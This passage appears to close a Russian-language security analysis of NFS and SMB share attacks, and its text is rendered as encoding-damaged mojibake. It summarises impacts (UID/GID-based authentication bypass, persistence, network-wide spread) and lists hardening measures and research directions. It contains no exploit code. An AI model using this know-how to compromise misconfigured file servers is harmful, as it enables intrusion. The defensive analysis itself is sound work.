2. **–û–±—Ö–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**: –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–∞ —É—Ä–æ–≤–Ω–µ UID/GID –≤–º–µ—Å—Ç–æ –ø–∞—Ä–æ–ª–µ–π
3. **–£—Å—Ç–æ–π—á–∏–≤–æ—Å—Ç—å**: –í–Ω–µ–¥—Ä—ë–Ω–Ω—ã–µ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –ø–æ—Å–ª–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
4. **–°–µ—Ç–µ–≤–∞—è —ç–∫—Å–ø–∞–Ω—Å–∏—è**: –û–¥–Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ ‚Üí —É–≥—Ä–æ–∑–∞ –≤—Å–µ–π —Å–µ—Ç–∏

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ:**
- –ñ—ë—Å—Ç–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —ç–∫—Å–ø–æ—Ä—Ç–∞ (`root_squash`, `no_all_squash`)
- –ó–∞–º–µ–Ω–∞ `admin users` –Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è + ACL
- –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞—Ñ–∏–∫–∞ (Kerberos –¥–ª—è NFS, SMB 3.0+)
- –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π
- –°–µ–≥–º–µ–Ω—Ç–∞—Ü–∏—è —Å–µ—Ç–∏ (–∏–∑–æ–ª—è—Ü–∏—è —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤)

–î–ª—è –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π:
- –ü–æ–∏—Å–∫ –Ω–æ–≤—ã—Ö –≤–µ–∫—Ç–æ—Ä–æ–≤ (NFSv4.2, SMB multichannel)
- –ê–Ω–∞–ª–∏–∑ –∑–∞—â–∏—Ç –≤ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã—Ö –§–° (Ceph, GlusterFS)
- –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –¥–µ—Ç–µ–∫—Ç–æ—Ä–æ–≤ –∞–Ω–æ–º–∞–ª—å–Ω–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π